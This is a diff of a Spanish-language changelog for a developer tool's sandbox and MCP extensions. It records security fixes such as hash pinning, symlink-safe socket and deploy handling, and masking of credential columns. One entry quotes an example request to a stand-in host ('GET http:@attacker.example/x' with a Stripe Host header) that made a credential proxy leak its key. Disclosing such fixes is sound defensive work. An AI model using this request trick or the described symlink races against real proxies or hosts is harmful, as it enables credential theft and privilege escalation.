@@ -35,7 +35,7 @@ y [`ext/sandbox/CHANGELOG.md`](ext/sandbox/CHANGELOG.md).
   comprueban el sha256 fijado (el que publica cada proyecto) y paran si no coincide.
   Otra versión se pide con su hash (`FC_VERSION`/`FC_SHA256`, `ALPINE_VERSION`/
   `ALPINE_SHA256`, `NODE_VERSION`/`NODE_SHA256`). Chrome for Testing no publica hashes:
-  la base `chrome` exige `CHROME_SHA256` del zip de `CHROME_VERSION` (154.0.8037.92).
+  la base `chrome` lleva fijado el sha256 del zip de 154.0.8037.92 (tamaño y MD5 comprobados contra los de Google Cloud Storage); otra versión pide `CHROME_SHA256`.
 - **Núcleo: el socket del daemon se prepara sin seguir enlaces.** Nace `0660` y cedido
   a `-socket-user` en un directorio privado y se renombra a su sitio; antes el `chmod`
   y el `chown` iban por el nombre y seguían un enlace puesto entre medias.
@@ -132,6 +132,10 @@ y [`ext/sandbox/CHANGELOG.md`](ext/sandbox/CHANGELOG.md).
 
 ### Seguridad
 
+- **`make deploy` de `ext/mcp` y `ext/sandbox` ya no pasa por `/tmp/<nombre>` fijo.**
+  Copiaban a `/tmp/kling-mcp`, `/tmp/kling-bridge`… y luego `sudo install`: otro usuario
+  del host podía dejar antes un enlace con ese nombre y root lo instalaba. Ahora, como el
+  deploy de la raíz, a un `mktemp -d` remoto que se borra al terminar.
 - **`kling db clone` ya no copia credenciales sin enmascarar.** La heurística de
   columnas sospechosas solo miraba datos personales: `password_hash`,
   `encrypted_password`, `api_key`, `access_token`, `client_secret`, `totp_seed`,
@@ -202,9 +206,6 @@ y [`ext/sandbox/CHANGELOG.md`](ext/sandbox/CHANGELOG.md).
   la primera página del registro.** Con un nombre corto (`github`, 630 resultados) daba
   por inequívoco el único `*/github` de la página 1 aunque hubiera más en las
   siguientes. Ahora recorre todas (hasta 50) y, con varios, pide el nombre completo.
-
-### Seguridad
-
 - **Proxy de credenciales: la clave ya no sale hacia otro host.** Un request-target
   opaco (`GET http:@attacker.example/x` con `Host: api.stripe.com`) elegía la
   credencial por el `Host`, pero la URL saliente se montaba pegando el request-target
